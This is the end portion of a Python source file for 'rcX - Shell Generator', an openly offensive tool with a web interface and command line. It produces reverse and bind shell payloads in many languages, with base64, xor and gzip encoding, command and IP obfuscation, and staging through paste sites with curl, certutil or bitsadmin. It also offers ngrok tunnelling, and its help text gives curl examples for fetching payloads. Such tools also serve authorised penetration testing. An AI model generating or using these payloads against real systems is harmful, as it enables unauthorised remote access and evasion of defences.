8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADHAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAADzAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADzAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXwAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAXwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACOAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAjgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAALQAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAtAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAvQAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAvQAAAAkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAC0AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAtAAAAAkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAI4AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAjgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXwAAAPMAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADzAAAAXwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAxwAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADHAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAABpAAAA7QAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAO0AAABpAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAACIAAAA8wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA8wAAAIgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAABzAAAA3QAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAADdAAAAdAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7AAAAjQAAANkAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA2AAAAI0AAAA7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAFUAAACFAAAAsAAAAM4AAADmAAAA+wAAAP8AAAD/AAAA+wAAAOYAAADOAAAAsAAAAIUAAABVAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"/><link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800" rel="stylesheet" type="text/css"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous"><script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/chosen/1.8.7/chosen.jquery.min.js" integrity="sha512-rMGGF4wg1R73ehtnxXBt5mbUfN9JUJwbk21KMlnLZDJh7BkPmeovBuddZCENJddHYYMkCh9hPFnPmS9sspki8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chosen/1.8.7/chosen.min.css" integrity="sha512-yVvxUQV0QESBt1SyZbNJMAwyKvFTLMyXSyBHDO4BG5t7k/Lw34tyqlSDlKIrIENIzCl+RVUNjmCPG+V/GMesRw==" crossorigin="anonymous" referrerpolicy="no-referrer"><meta charset="UTF-8"><style>.chosen-container-multi .chosen-choices li.search-field input[type=text]{height:34px}.chosen-container-multi .chosen-choices li.search-choice{border:1px solid #ced4da;line-height:20px}.input-group>:not(:first-child):not(.dropdown-menu):not(.valid-tooltip):not(.valid-feedback):not(.invalid-tooltip):not(.invalid-feedback){min-width:100px}.nav-tabs>li>.nav-link{color:gray;padding:5px;border-radius:3px}button.close{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none;-moz-appearance:none;appearance:none}.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;filter:alpha(opacity=20);opacity:.2}.accordion-button::after{background-image:url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='%23333' xmlns='http://www.w3.org/2000/svg'%3e%3cpath fill-rule='evenodd' d='M8 0a1 1 0 0 1 1 1v6h6a1 1 0 1 1 0 2H9v6a1 1 0 1 1-2 0V9H1a1 1 0 0 1 0-2h6V1a1 1 0 0 1 1-1z' clip-rule='evenodd'/%3e%3c/svg%3e");transform:scale(.7)!important}.accordion-button:not(.collapsed)::after{background-image:url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='%23333' xmlns='http://www.w3.org/2000/svg'%3e%3cpath fill-rule='evenodd' d='M0 8a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1z' clip-rule='evenodd'/%3e%3c/svg%3e")}</style></head><body><h1 class="text-center text-muted">rcX - Shell Generator</h1><div class="container"><form id="form" class="form"><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Host</span></div><input placeholder="127.0.0.1" name="host" class="form-control" onkeypress="return event.charCode>=65&&event.charCode<=90||event.charCode>=97&&event.charCode<=122||event.charCode>=48&&event.charCode<=57||45==event.charCode||46==event.charCode||32==event.charCode" maxlength="255" oninput="this.value.length>this.maxLength&&(this.value=this.value.slice(0,this.maxLength))"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Port</span></div><input type="number" placeholder="44444" name="port" class="form-control" maxlength="5" oninput="this.value.length>this.maxLength&&(this.value=this.value.slice(0,this.maxLength))"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Shell Type</span></div><select id="shell_type" name="shell_type" class="form-control"><option value="bash" selected>Bash</option><option value="netcat">Netcat</option><option value="telnet">Telnet</option><option value="openssl">OpenSSL</option><option value="python">Python</option><option value="powershell">PowerShell</option><option value="csharp">C#</option><option value="php">PHP</option><option value="ruby">Ruby</option><option value="socat">Socat</option><option value="golang">Golang</option><option value="perl">Perl</option><option value="java">Java</option><option value="nodejs">NodeJS</option><option value="lua">Lua</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Platform</span></div><select id="platform" name="platform" class="form-select"><option value="linux" selected>Linux</option><option value="windows">Windows</option></select><button style="height:38px;max-width:40px;min-width:40px;padding-left:10px;border:1px solid #ced4da" class="accordion-button collapsed col" type="button" data-bs-toggle="collapse" data-bs-target="#more" aria-expanded="false" aria-controls="more"></button></div><div class="collapse" id="more"><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Direction</span></div><select id="platform" name="direction" class="form-select"><option value="reverse" selected>Reverse</option><option value="bind">Bind</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Protocol</span></div><select name="protocol" class="form-select"><option value="tcp" selected>TCP</option><option value="udp">UDP</option><option value="https">HTTPS</option><option value="http">HTTP</option><option value="dns">DNS</option><option value="icmp">ICMP</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Shell Path</span></div><input placeholder="/bin/sh" name="shell_path" class="form-control" onkeypress="return!(42==event.charCode||60==event.charCode||62==event.charCode||63==event.charCode||124==event.charCode)"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">BinaryName</span></div><input placeholder="python3.exe" name="binary_name" class="form-control" onkeypress="return!(42==event.charCode||60==event.charCode||62==event.charCode||63==event.charCode||124==event.charCode)"></div><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Interactive Mode</span></div><select name="interactive_mode" class="form-select"><option value="interactive" selected>Interactive</option><option value="semi_interactive">Semi-Interactive</option><option value="non_interactive">Non-Interactive</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Encryption</span></div><select name="encryption" class="form-select"><option selected></option><option value="ssl">SSL</option><option value="aes">AES</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">StagingUrl</span></div><select id="staging_url" name="staging_url" class="form-select"><option selected></option><option value="0">https://tcp.st</option><option value="1">https://oshi.at</option><option value="2">https://temp.sh</option><option value="3">https://p.ip.fi</option><option value="4">https://sicp.me</option><option value="5">https://transfer.sh</option><option value="6">https://dpaste.com</option><option value="7">https://termbin.com</option><option value="8">https://p.teknik.io</option><option value="9">https://www.toptal.com</option><option value="10">https://paste.centos.org</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">StagingCmd</span></div><select id="staging_cmd" name="staging_cmd" class="form-select"><option value="0" selected>curl</option><option value="1">wget</option><option value="2">jrunscript</option><option value="3">bitsadmin</option><option value="4">certutil</option><option value="5">powershell-Invoke-WebRequest</option><option value="6">powershell-curl</option><option value="7">powershell-wget</option><option value="8">powershell-bitstransfer</option><option value="9">powershell-DownloadString</option><option value="10">powershell-DownloadFile</option><option value="11">certoc.exe</option><option value="12">GfxDownloadWrapper.exe</option><option value="13">hh.exe</option><option value="14">lwp-download</option></select></div><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Encoder</span></div><select data-placeholder="base64, hex, xor, gzip..." multiple name="encoder[]" class="chosen-select"><option value="base64">base64_cmd</option><option value="base64-c">base64_code</option><option value="hex">hex_cmd</option><option value="hex-c">hex_code</option><option value="xor">xor_cmd</option><option value="xor-c">xor_code</option><option value="rot13-c">rot13_code</option><option value="gzip">gzip</option><option value="bzip2">bzip2</option></select></div><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Obfuscator</span></div><select name="obfuscator" class="form-select"><option selected></option><option value="replace_char">ReplaceChar</option><option value="reverse">ReverseCMD</option></select><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">IPObfuscator</span></div><select name="ip_obfuscator" class="form-select"><option selected></option><option value="ip2int">ip2int</option><option value="ip2oct">ip2oct</option><option value="ip2hex">ip2hex</option></select><div class="input-group-prepend localtunnel"><span class="input-group-text" id="inputGroup-sizing-default">localtunnel</span></div><select id="localtunnel" name="localtunnel" class="form-select"><option selected></option><option value="ngrok_us">Ngrok-us</option><option value="ngrok_eu">Ngrok-eu</option><option value="ngrok_ap">Ngrok-ap</option><option value="ngrok_au">Ngrok-au</option><option value="ngrok_sa">Ngrok-sa</option><option value="ngrok_jp">Ngrok-jp</option><option value="ngrok_in">Ngrok-in</option><option value="ng_close">Shutdown Ngrok</option></select></div></div></form><div class="input-group mb-3"><div class="input-group-prepend"><span class="input-group-text" id="inputGroup-sizing-default">Test Terminal</span></div><select id="terminal_id" name="terminal" class="form-select"><option selected></option><option value="1">terminal-1</option><option value="2">terminal-2</option><option value="3">terminal-3</option><option value="4">...</option><option value="5">...</option><option value="6">...</option></select></div><div id="content"><ul class="nav nav-tabs" id="tabs" role="tablist"><li class="nav-item"><a class="nav-link active" id="tab-list" data-bs-toggle="tab" href="#output" role="tab" aria-controls="output" aria-selected="true">Output</a></li></ul><div class="tab-content"><div id="output" class="tab-pane fade show active" role="tabpanel" aria-labelledby="output-tab"><div id="output-title" class="text-info bg-dark"></div><div id="output-data"></div></div></div></div><script>document.getElementById("shell_type").addEventListener("change",function(){"powershell"==this.value?document.getElementById("platform").value="windows":"bash"==this.value&&(document.getElementById("platform").value="linux")});const h=["127.0.0.1","localhost"];h.includes(window.location.host)||(document.querySelector(".localtunnel").style="display:none",document.getElementById("localtunnel").style.visibility="hidden"),$(".chosen-select").chosen({no_results_text:"Oops, nothing found!",width:"700px"});async function gen(t){const e=await fetch(t,{method:"POST",body:new FormData(form)});t=await e.text();t&&(t=JSON.parse(t),$("#output-title").html(t.t),$("#output-data").html(t.r))}document.getElementById("terminal_id").addEventListener("change",function(){var t,e,n;this.value&&(t="terminal-"+this.value,e="terminal_"+this.value,$("#tabs").append($('<li class="nav-item"><a class="nav-link" href="#'+e+'" role="tab" data-bs-toggle="tab">'+t+'<button class="close" type="button" title="Close this page">×</button></a></li>')),1==this.value?n="https://console.python.org/python-dot-org-console/":2==this.value?n="https://www.programiz.com/python-programming/online-compiler/":3==this.value&&(n="https://httpie.io/cli/run"),$('<div class="tab-pane fade" id="'+e+'"><div class="row"><div class="col"><a class="btn btn-light btn-sm float-left" data-bs-toggle="collapse" href="#tips" role="button" aria-expanded="false" aria-controls="tips">Help</a><div class="collapse" id="tips"><div class="card card-body">Python into the bash: <pre>__import__("pty").spawn("/bin/sh")<br>__import__("os").system("bash -i")</pre></div></div></div><div class="col"><input class="btn btn-light btn-sm float-end" type="button" id="reload" value="Reload" /></div></div><iframe id="'+e+'" style="border: none; width: 100%;min-height: 500px;" name="terminal1btn" class="embed-responsive-item" allowfullscreen src="'+n+'"></iframe></div>').appendTo(".tab-content"),$("#tabs a[href=#"+e+"]").tab("show"),$("#reload").click(function(){document.querySelector(".embed-responsive-item").src+=""}))}),$("form").on("keyup change",function(t){t.preventDefault();t=document.querySelector("#tab-list");new bootstrap.Tab(t).show(),gen("/gen")}),$(document).ready(function(){$("#tabs").on("click",".close",function(){var t=$(this).parents("a").attr("href");$(this).parents("li").remove(),$(t).remove(),$("#tabs a:first").tab("show")});document.getElementById("tabs")});</script></div></body></html>'''

    @app.route("/help")
    def _help():
        usage = '''Usage:\n curl {0}<patform>/<shell_type>/<host>/<port>/<encoder>/<obfuscator>/<stagingurl>/<staging_cmd>
                \nExample:\n 1.Get a bash reverse shell payload\n  curl {0}linux/bash/127.0.0.4/8888
                \n 2.Base64 encoded\n  curl {0}linux/bash/127.0.0.4/8888/base64
                \n 3.Base64 and hex encoded\n  curl {0}linux/bash/127.0.0.4/8888/base64,hex
                \n 4.Gzip compress and replace_char(obfuscation method)\n  curl {0}linux/bash/127.0.0.4/8888/gzip/replace_char
                \n 5.xor encoded and reverse(obfuscation method)\n  curl {0}linux/bash/127.0.0.4/8888/xor/reverse
                \n 6.Get a windows powershell reverse shell payload\n  curl {0}windows/powershell/127.0.0.4/44444
                \n 7.Only replace_char(obfuscation method), without using encoder\n  curl {0}windows/powershell/127.0.0.4/44444/,/replace_char
                \n 8.Only use stagers, without any encoder and obfuscator\n  curl {0}linux/bash/127.0.0.4/8888/,/,/1/1
                \n 9.Get a linux netcat bind shell payload\n  curl {0}bind/linux/netcat/127.0.0.4/8888
                '''.format(request.host_url)
        return usage

    @app.errorhandler(404)
    def _404(_):
        return ""

    @app.errorhandler(Exception)
    def _500(_):
        print(__import__('traceback').format_exc())
        return ""

    app.run(host=host, port=port, debug=debug, use_reloader=False)


def main():
    args = cmdLineParser()
    if args.web:
        create_app(args.web_host, args.web_port, args.web_debug)
    else:
        payload = Generator(host=args.lhost, port=args.lport, shell_type=args.type,
                            direction=args.direction, protocol=args.protocol,
                            encoder=args.encoder,
                            platform=args.platform, shell_path=args.shell_path,
                            ip_obfuscator=args.ip_obf, obfuscator=args.obf,
                            staging_url=args.staging_url, staging_cmd=args.staging_cmd,
                            localtunnel=args.tunnel, web=args.web, output=args.output)
        op = Utils()
        print('\n' + op.format(payload[0], title=True))
        if args.table:
            op.printTable(payload[1])
        else:
            print(op.format(payload[1]))

        if args.clip:
            __import__('pyperclip').copy(list(payload[1].values())[args.clip - 1])
            print("The payload has been copied to clipboard.")

        if args.tunnel:
            try:
                from pyngrok import ngrok
                tun = ngrok.get_tunnels()
                print(tun[0], "(Press CTRL+C to quit)")
                ngp = ngrok.get_ngrok_process()
                ngp.proc.wait()
            except KeyboardInterrupt:
                __import__('sys').exit()


if __name__ == "__main__":
    __import__('sys').exit(main())
